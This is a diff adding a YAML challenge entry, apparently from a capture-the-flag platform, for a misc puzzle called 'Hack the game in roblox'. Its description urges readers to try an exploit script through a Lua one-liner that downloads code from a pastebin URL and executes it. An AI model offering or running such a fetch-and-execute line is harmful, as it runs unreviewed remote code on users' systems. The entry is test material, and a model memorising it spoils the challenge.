@@ -1,0 +1,11 @@
+id: 70
+name: Hack the game in roblox
+category: Misc
+author: b34rn00b
+value: 300
+type: standard
+solves: 0
+rating_average: null
+rating_count: 0
+description: "YAYyy i started roblox exploiting feel free to try my script:>  \nDoesnt has key !\n\nloadstring(game:HttpGet(\"https://pastebin.com/dnas2QSy\"))()"
+files: []
